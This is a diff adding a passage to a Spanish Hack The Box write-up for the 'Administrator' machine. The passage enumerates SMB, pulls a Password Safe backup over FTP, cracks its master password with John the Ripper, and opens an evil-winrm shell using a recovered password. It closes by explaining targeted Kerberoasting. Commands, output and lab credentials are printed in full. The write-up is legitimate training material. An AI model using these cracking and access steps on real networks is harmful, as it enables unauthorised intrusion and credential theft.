@@ -347,6 +347,187 @@ Así que hacemos lo mismo con el usuario benjamin, para demostrar que funcionó 
 ![](../assets/images/htb-administrator/imagen4.png) 
 
 
+Ahora ya podemos enumerar los recursos en smb y fpt: 
 
+```bash 
+└─$ smbmap -H 10.10.11.42 -u benjamin -p 'newP@ssword2022' -r
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
+                                                                                                                             
+[+] IP: 10.10.11.42:445 Name: administrator.htb         Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        ./IPC$
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown
+        fr--r--r--                5 Sun Dec 31 19:03:58 1600    lsass
+        fr--r--r--                4 Sun Dec 31 19:03:58 1600    ntsvcs
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-2a0-0
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-39c-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-220-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-3d8-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-4b4-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc
+        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-610-0
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-2a0-1
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-784-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    RpcProxy\51419
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    c33aae1ebb2318da
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    RpcProxy\593
+        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    netdfs
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    tapsrv
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ROUTER
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-298-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-a78-0
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-a68-0
+        NETLOGON                                                READ ONLY       Logon server share 
+        ./NETLOGON
+        dr--r--r--                0 Fri Oct  4 15:49:22 2024    .
+        dr--r--r--                0 Fri Oct  4 15:54:15 2024    ..
+        SYSVOL                                                  READ ONLY       Logon server share 
+        ./SYSVOL
+        dr--r--r--                0 Fri Oct  4 15:49:22 2024    .
+        dr--r--r--                0 Fri Oct  4 15:49:22 2024    ..
+        dr--r--r--                0 Fri Oct  4 15:49:22 2024    administrator.htb
+[*] Closed 1 connections
+``` 
+
+Pero aqui nada interesante, 
+
+Y con ftp si que encontramos algo interesante: 
+
+```bash 
+└─$ ftp 10.10.11.42
+Connected to 10.10.11.42.
+220 Microsoft FTP Service
+Name (10.10.11.42:kali): benjamin
+331 Password required
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+229 Entering Extended Passive Mode (|||65404|)
+150 Opening ASCII mode data connection.
+10-05-24  09:13AM                  952 Backup.psafe3
+226 Transfer complete.
+ftp> get Backup.psafe3
+local: Backup.psafe3 remote: Backup.psafe3
+229 Entering Extended Passive Mode (|||65411|)
+125 Data connection already open; Transfer starting.
+100% |************************************************************************************************************************************************|   952       16.02 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 3 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+952 bytes received in 00:00 (15.85 KiB/s)
+ftp> 
+``` 
+
+Instalamos `passwordsafe` que es de esta herramienta de gestion de contraseñas a la que pertenece el fichero que acabamos de descargar de fpt
+```bash 
+sudo apt install passwordsafe
+
+pwsafe
+``` 
+
+Esto pide contraseña, pero podemos intentar crackearla con jhon: 
+```bash 
+└─$ locate john | grep -v "share" | grep "safe"
+/usr/bin/pwsafe2john
+```
+
+
+Y crackeamos:
+```bash 
+┌──(kali㉿kali)-[~/labs-hack/administrator]
+└─$ pwsafe2john Backup.psafe3 
+Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
+                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/labs-hack/administrator]
+└─$ pwsafe2john Backup.psafe3 > hash
+                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/labs-hack/administrator]
+└─$ john hash -w:/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2048 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tekieromucho     (Backu)     
+1g 0:00:00:01 DONE (2025-04-22 03:23) 0.6896g/s 4237p/s 4237c/s 4237C/s newzealand..iheartyou
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+``` 
+
+Usamos la cotraseña y vemos varios usuarios. 
+
+![](../assets/images/htb-administratos/imagen7.png)
+
+Recordando que tanto emyli como alexander son usuarios válidos que enumeramos al inicio, valilando la contraseña vemos que la contraseña para emily nos funciona,y es aquí donde se encuentra la primera flag de usuario: 
+```bash 
+┌──(kali㉿kali)-[~/labs-hack/administrator]
+└─$ netexec smb 10.10.11.42 -u emily -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb"                                            
+SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.42     445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
+                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/labs-hack/administrator]
+└─$ evil-winrm -i 10.10.11.42 -u emily -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\emily\Documents> dir ..\Desktop\
+
+
+    Directory: C:\Users\emily\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
+-ar---         4/21/2025  10:02 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\emily\Documents>
+```
+
+Explorando a esta usuaria en bloodhount vemos que tiene permisos de genericwrite sobre el usuari **ethan**, así que nos descargamos la [herramienta](https://github.com/ShutdownRepo/targetedKerberoast) que nos proporciona bloodhount para el nn Targeted Kerberoast attack (ataque Kerberoasting dirigido), que es una versión más refinada del ataque clásico Kerberoasting, que se enfoca en obtener hashes de tickets de servicio (TGS) en Active Directory, pero solo de cuentas específicas, como cuentas de alto valor (por ejemplo, cuentas con privilegios elevados como Domain Admins, SQLService, etc.).
+
+El ataque Kerberoasting aprovecha el hecho de que en Active Directory:
+ - Cualquier usuario autenticado puede solicitar un Ticket Granting Service (TGS) para cualquier cuenta que tenga un Service Principal Name (SPN).
+ - El ticket TGS está cifrado con la contraseña del servicio asociado (el usuario que corre ese servicio).
+ - Estos tickets pueden ser crackeados offline con herramientas como Hashcat o John the Ripper, revelando la contraseña del usuario de servicio.
+
+**Noto que mi maqina atacante está desfasada casi 7 horas con el servidor**
+```bash 
+ntpdate -q 10.10.11.42
+2025-04-22 11:49:34.229874 (-0400) +25201.105948 +/- 0.055748 10.10.11.42 s1 no‑leap
+```
 
 
